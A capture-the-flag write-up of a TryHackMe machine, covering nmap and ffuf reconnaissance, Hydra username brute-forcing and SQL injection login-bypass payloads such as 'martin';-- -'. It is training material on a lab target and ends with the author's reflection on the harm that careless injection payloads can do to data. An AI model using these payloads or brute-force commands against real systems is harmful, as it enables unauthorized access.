## Introduction
This is a simple machine from Try Hack Me that teaches us how to use injection payloads carefully and the consequences of using them without precaution.
## Initial Recon
As mentioned in the description, we only have a login page on the machine that we need to bypass to retrieve our flag. However, it is also mentioned to treat this machine as a real target. So, we will proceed with this as a normal CTF.

A quick `Nmap` scan for port scanning:
```
nmap <target_ip>
```
Result:
```
Nmap scan report for 10.10.85.240
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 56.40 seconds
```

A deep scan for services and versions:
```
nmap -A -p22,80 <target_ip>
```
Result:
```
Nmap scan report for 10.10.85.240
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 2e:54:89:ae:f7:91:4e:33:6e:10:89:53:9c:f5:92:db (RSA)
|   256 dd:2c:ca:fc:b7:65:14:d4:88:a3:6e:55:71:65:f7:2f (ECDSA)
|_  256 2b:c2:d8:1b:f4:7b:e5:78:53:56:01:9a:83:f3:79:81 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Lesson Learned?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.69 seconds
```

Visit the web page at `http://<target_ip>:80/`:
![Pasted image 20231126131536](https://github.com/Itskmishra/tryhackme-writeups/assets/141756495/131dd429-3f69-4d19-8cc8-9914b6762457)


This is a simple login page. So now let's run a directory fuzzing attack to know if there are any interesting paths.

Dir fuzzing with `ffuf`:
```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<target_ip>/FUZZ
```
Result:
```
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 212ms]
                                [Status: 200, Size: 1223, Words: 35, Lines: 32, Duration: 2475ms]
.htpasswd             [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3619ms]
.hta                         [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 656ms]
index.php              [Status: 200, Size: 1223, Words: 35, Lines: 32, Duration: 643ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 352ms]
server-status        [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 162ms]
```

At `index.php`, there is the login page, `manual` is the default manual page of the Apache server, and `server-status` is inaccessible. There is nothing else on the page except the login form. As a result, we can only attempt authentication attacks. First, we need to understand that we don't have any usernames or passwords to start with. Let's try our basic SQL injection to attempt to bypass it. 

SQL injection payload:
```
Username: admin' or 1 = 1 --
Password: password
```
After injecting this payload, it shows a message to us.

![Pasted image 20231126133201](https://github.com/Itskmishra/tryhackme-writeups/assets/141756495/079fba70-ec2d-4872-8d68-d337c79d23db)


Let's restart the machine and try something else. Upon entering an incorrect username and password, we receive a message that reads `Invalid username and password`.

We now understand that we cannot use regular payloads on this login form. However, we do know that it is vulnerable to SQL injection. Therefore, we will need to find some good payloads that can help us bypass the form. After conducting some research, we found the following:

> Auth Bypass: admin'; -- -
> SELECT * FROM users WHERE username = 'admin'; -- -' AND password = 'password'


This is a harmless payload that won't cause any damage to data. It might also help us bypass the form. Let's test if it works or not by entering the following details:

```
username: admin ' -- -
password: password
```

We received the same response, which means maybe the user "admin" doesn't exist in the table. Let's execute a brute force attack to enumerate usernames since there is a possibility that the invalid message will change if we enter the correct payload. 

For this, we'll be using "Hydra" and "SecLists". If we receive a different response message while using the correct username, we will be able to bypass this form.

Here's the command for the Hydra brute force attack:

```
hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p password <target_ip> http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."
```

Result:

![Pasted image 20231126135835](https://github.com/Itskmishra/tryhackme-writeups/assets/141756495/4e41cc9d-936d-4b26-8247-901b4113e1be)

We are able to find some usernames in the result.

Let's test whether these usernames are valid by entering the username found in the result of Hydra with a random password. I am using 'martin' as the username and 'password' as the password. 

Response:

![Pasted image 20231126135901](https://github.com/Itskmishra/tryhackme-writeups/assets/141756495/bc5e9a3b-d446-4c17-81b2-6def86304751)


So now we have found a valid username, let's test our payload with this username:

Payload:
```
Username: martin';-- -
Password: password
```

Yay! We were able to bypass the login form and find our flag.
![Pasted image 20231126140301](https://github.com/Itskmishra/tryhackme-writeups/assets/141756495/6540c614-6aee-4e1d-b073-b5c0bbeb89df)


## Conclusion
This machine is very informative to me because it is used to inject regular SQL payloads with every login form. However, I have come to realize that injecting harmful SQL payloads can cause a lot of damage to the target, and it is not a good practice for penetration testing. From now on, I will think twice before using payloads.
